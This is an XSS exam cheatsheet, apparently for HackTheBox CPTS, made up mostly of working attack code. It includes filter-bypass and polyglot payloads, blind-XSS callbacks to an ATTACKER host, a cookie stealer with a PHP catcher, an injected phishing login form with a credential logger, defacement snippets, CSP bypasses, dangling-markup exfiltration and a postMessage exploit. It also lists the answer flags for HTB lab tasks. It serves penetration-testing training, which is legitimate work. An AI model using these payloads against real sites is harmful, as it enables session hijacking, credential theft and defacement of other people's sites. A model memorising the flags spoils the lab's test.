# Cross-Site Scripting (XSS) — Exam Cheatsheet

---

## XSS Types

| Type | Where input lives | Detection |
|------|-------------------|-----------|
| **Stored** | Saved to DB, served to other users | Payload fires every reload, for every user |
| **Reflected** | Echoed back in immediate response | Payload only fires when victim visits crafted URL |
| **DOM-based** | Processed client-side only (`#` fragment, `location.hash`) | Payload never reaches server |

---

## Detection Payloads

```html
<script>alert(window.origin)</script>      <!-- shows current origin -->
<script>alert(document.cookie)</script>    <!-- shows cookies -->
<script>print()</script>                    <!-- print dialog — bypass alert blocks -->
<plaintext>                                  <!-- stops HTML render — visual confirm -->
```
> Start with `alert(window.origin)` to confirm which page is running your script. Use `print()` if the app blocks `alert()`. Use `<plaintext>` when you just need a visual sign that HTML parsing stopped.

When `<script>` is filtered (innerHTML, wp_kses):
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
<details open ontoggle=alert(1)>
```
> These bypass filters that strip `<script>` tags. `<img onerror>` is the most reliable — a broken image source always triggers the error event. Mix and match based on what the target allows.

---

## Breakout Patterns

| Injection context | Prefix |
|-------------------|--------|
| Raw HTML body | (none) |
| `<input value="X">` | `">` |
| `<input value='X'>` | `'>` |
| `<a href="X">` | `">` (need `http://` prefix to pass URL validation) |
| `<a href='X'>` | `'>` |
| `<img src='X'>` | `'>` |
| Inside `<script>...X...</script>` | `';` |
| Inside JS string `var x = "X"` | `";` |
| URL fragment `#X` (DOM) | (none — depends on sink) |

---

## DOM XSS Sources & Sinks

**Sources:** `document.URL`, `location.hash`, `location.search`, `document.referrer`, `localStorage`, input fields

**Dangerous sinks:**
- Native: `innerHTML`, `outerHTML`, `document.write()`, `eval()`
- jQuery: `html()`, `parseHTML()`, `add()`, `append()`, `prepend()`, `after()`, `before()`, `replaceWith()`

**Safe sinks:** `textContent`, `innerText`, jQuery `text()`

---

## Discovery Tools

```bash
# XSStrike — best free option
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike && pip install -r requirements.txt
python xsstrike.py -u "http://TARGET/page.php?param=test"
```
> Clones XSStrike, installs its Python dependencies, then scans a URL. Replace `param=test` with the parameter you want to test. XSStrike generates context-aware payloads and reports which ones work.

Payload lists on Kali:
- `~/SecLists/Fuzzing/XSS/robot-friendly/`  ← ffuf/burp
- `~/SecLists/Fuzzing/XSS/Polyglots/`        ← multi-context strings

---

## Blind XSS — Per-Field Probing

When you can't see where input lands (admin panel, support ticket), use unique callback paths:

```html
<!-- in field "fullname" -->
<script src=http://ATTACKER/fullname></script>
<!-- in field "email" -->
<script src=http://ATTACKER/email></script>
```
> Each field gets a unique URL path. When the admin views the submission, the incoming request path tells you which field triggered. Replace `ATTACKER` with your tun0 IP and listener port.

Whichever path fires identifies the vulnerable field. Try with breakouts:
```html
"><script src=http://ATTACKER/field_dq></script>
'><script src=http://ATTACKER/field_sq></script>
http://x"><script src=http://ATTACKER/url></script>   <!-- href context -->
```
> Try all three breakout prefixes. Double-quote (`">`), single-quote (`'>`), and the `http://x"` form for href attributes that require a URL prefix before they accept a quote. Use whichever matches the HTML context.

---

## Cookie Stealer

`script.js`:
```javascript
new Image().src='http://ATTACKER:8080/index.php?c='+document.cookie
```

`index.php` (catcher):
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "IP: {$_SERVER['REMOTE_ADDR']} | {$cookie}\n");
        fclose($file);
    }
}
?>
```

Start listener (port 80 needs sudo, use 8080+ otherwise):
```bash
mkdir /tmp/listener && cd /tmp/listener
# write index.php + script.js
php -S 0.0.0.0:8080 &
```
> Creates a working directory, then starts PHP's built-in web server on all interfaces on port 8080. The `&` puts it in the background. Port 80 requires root; use 8080 or higher to avoid that.

Use stolen cookie:
```bash
curl -sk "http://TARGET/admin/" -H "Cookie: name=value"
```
> Replays the stolen cookie in a curl request. Replace `name=value` with the cookie name and value from `cookies.txt`. This logs you in as the victim without a password.

---

## Phishing — Inject Login Form

```html
'><script>
document.write('<h3>Please login</h3><form action=http://ATTACKER:8080>'
+'<input name="username"><input name="password" type="password">'
+'<input type="submit" value="Login"></form>');
document.getElementById('urlform').remove();
</script><!--
```
> Breaks out of the attribute with `'>`, writes a fake login form pointing to your server, and removes the real form. The trailing `<!--` comments out leftover original HTML so broken tags don't give away the attack.

`index.php` (credential catcher with redirect):
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $f = fopen("creds.txt", "a+");
    fputs($f, "User: {$_GET['username']} | Pass: {$_GET['password']}\n");
    header("Location: http://TARGET/original_page");
    fclose($f);
    exit();
}
?>
```

---

## Defacing

```html
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://attacker/img.png"</script>
<script>document.title = "Hacked"</script>
<script>document.getElementsByTagName('body')[0].innerHTML = "..."</script>
```
> Four building blocks for defacement. Background color and image, page title, and full body replacement. Inject via stored XSS to affect every visitor until the payload is removed.

---

## Prevention (CPTS exam fodder)

| Layer | Stops | Tool |
|-------|-------|------|
| Output encoding | Rendered XSS | `htmlspecialchars()` / `htmlentities()` / html-entities (Node) |
| CSP header | Injected `<script>` | `Content-Security-Policy: script-src 'self'` |
| HttpOnly cookies | Cookie theft via XSS | `Set-Cookie: ...; HttpOnly` |
| Input sanitization | Stored attacks | DOMPurify (front+back) |
| Input validation | Malformed input | regex / `filter_var()` |
| WAF | Common patterns | ModSecurity, Cloudflare — bypassable |

**Safe JS sinks:** `textContent`, `innerText`, jQuery `text()`

---

## Lab Flag Reference

| Section | Type | Field | Payload | Flag |
|---------|------|-------|---------|------|
| 2 Stored | task | `<script>alert(document.cookie)</script>` | `HTB{570r3d_f0r_3v3ry0n3_70_533}` |
| 3 Reflected | task (GET) | same | `HTB{r3fl3c73d_b4ck_2_m3}` |
| 4 DOM | `#task=` fragment | `<img src='' onerror=alert(document.cookie)>` | `HTB{pur3ly_cl13n7_51d3}` |
| 5 Discovery | email (error path) | — | — (Q1=email, Q2=reflected) |
| 7 Phishing | url (img src breakout) | `'>` + injected login form | `HTB{r3f13c73d_cr3d5_84ck_2_m3}` |
| 8 Hijacking | imgurl (blind) | `"><script src=ATTACKER/script.js></script>` | `HTB{4lw4y5_53cur3_y0ur_c00k135}` |
| 10 Assessment | url field (WordPress) | `http://x"><script src=ATTACKER/script.js></script>` | `HTB{cr055_5173_5cr1p71n6_n1nj4}` |

---

## Polyglot Payloads (work in multiple contexts)

When you don't know the injection context (HTML body, attribute, JS string, URL), a polyglot fires in all of them.

```html
<!-- Compact polyglot (Gareth Heyes / 0xsobky) — single string -->
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>

<!-- DOMPurify-bypass polyglot (when DOMPurify is the only sanitizer): -->
<svg><svg onload=alert(1)>

<!-- mXSS polyglot (mutation XSS — works when innerHTML re-parses): -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- Wordlist of polyglots:
~/SecLists/Fuzzing/XSS/Polyglots/XSS-Polyglots.txt        -->
```

---

## CSP Bypass Techniques

When `Content-Security-Policy` blocks inline scripts, you need a permitted source.

### Recon — see the CSP first
```bash
curl -sI http://TARGET/ | grep -i content-security
# Look for: script-src, default-src, base-uri, object-src
```
> Fetches only the response headers (`-I`) and filters for the Content Security Policy (CSP) line. Look for weak directives like `unsafe-inline`, `unsafe-eval`, or wildcard sources.

### CSP Evaluator
- Paste the policy at https://csp-evaluator.withgoogle.com/
- Highlights weak directives

### Common CSP bypasses

| CSP weakness | Bypass |
|--------------|--------|
| `script-src 'unsafe-inline'` | XSS works directly — CSP is useless |
| `script-src 'unsafe-eval'` | Use `eval(atob('...'))` to bypass framework sanitization |
| `script-src *` | Any external host — load from your server |
| `script-src https:` | Use any HTTPS CDN with hostable JS (gist, jsfiddle) |
| `script-src 'self'` + JSONP endpoint | Load `/some/jsonp?callback=alert(1)` — JSONP becomes script |
| `script-src 'self'` + file upload | Upload a `.js` to a permitted directory |
| `script-src 'nonce-XYZ'` (static) | Reuse the nonce from page source: `<script nonce="XYZ">alert(1)</script>` |
| `script-src 'strict-dynamic'` | Find a `<script>` that calls `document.createElement('script')` and inject through it |
| `base-uri` missing | `<base href="//attacker.com">` redirects relative `<script src="/js/app.js">` to attacker |
| `object-src` missing/`*` | `<object data="data:text/html,<script>alert(1)</script>">` |

### Whitelist source abuse
```html
<!-- Common script-src whitelisted CDNs that host attacker-controllable code: -->
script-src ajax.googleapis.com → load Angular and use template injection
script-src cdnjs.cloudflare.com → many libs allow user-controlled inputs that lead to RCE
script-src *.google.com → use Google Caja or AppEngine for hosted JS
```
> When a Content Security Policy (CSP) whitelists a CDN that hosts user-controllable content, load a payload from that CDN. Angular template injection and JSONP callbacks are common abuse paths.

### Dangling markup (no JS execution but data exfil)
```html
<!-- When CSP fully blocks script but allows form/img: -->
<img src='http://attacker/?data=
<!-- Page content from this point onward is sent to attacker as a URL -->
```
> An unclosed `src` attribute causes the browser to treat all following page text as part of the URL. This leaks page content to your server without executing any JavaScript — useful when CSP is strict.

---

## mXSS (Mutation XSS)

When `innerHTML` re-parses HTML, browsers can MUTATE markup that DOMPurify already sanitized.

```html
<!-- Survives DOMPurify because <math> + <p title> mutates after re-parsing -->
<math><mtext><table><mglyph><style><img title="</style><img src=x onerror=alert(1)>">

<!-- Trigger: anywhere innerHTML is read then re-written (e.g., jQuery html().html()) -->
```

> mXSS is rare in CTFs but appears in advanced XSS labs (HackTheBox Pro, intigriti CTFs).

---

## postMessage XSS (Cross-Window Messaging)

```html
<!-- Vulnerable code (no origin check): -->
window.addEventListener('message', e => {
    document.getElementById('output').innerHTML = e.data;   // sink!
});

<!-- Exploit (from your malicious page): -->
<iframe src="https://victim.com" id="v"></iframe>
<script>
document.getElementById('v').onload = () => {
    document.getElementById('v').contentWindow.postMessage(
        '<img src=x onerror=alert(document.cookie)>', '*'
    );
};
</script>
```

> Check for vulnerable listeners with: `grep -r 'addEventListener.*message' static/js/`

---

## Self-XSS → Stored / DoS

Self-XSS (XSS that only fires for yourself) seems useless — UNTIL you chain it:
- Combined with CSRF → forces victim to inject XSS into their own profile
- In an admin tool → cause persistent self-DoS for admin (locked out of UI)
- Cookie storage → write malicious payload to localStorage, fires when victim visits

---

## Decision Tree When Stuck

```
No reflection on success page?
  → Try the error/failure path (Section 5 lesson)
  → Check headers (User-Agent, Referer)

<script> filtered?
  → Use <img onerror>, <svg onload>, <body onload>

Blind XSS (no visibility into render context)?
  → Per-field unique callback path
  → Try multiple breakouts: '> ">  no-quote

Breakout not working in href context?
  → Add http:// prefix to pass URL validation
  → Then break out with "

Admin bot not biting?
  → Wait 2-5 minutes (cron-based)
  → Verify your listener is reachable from victim subnet (curl from attacker:port works ≠ target can reach you)
```
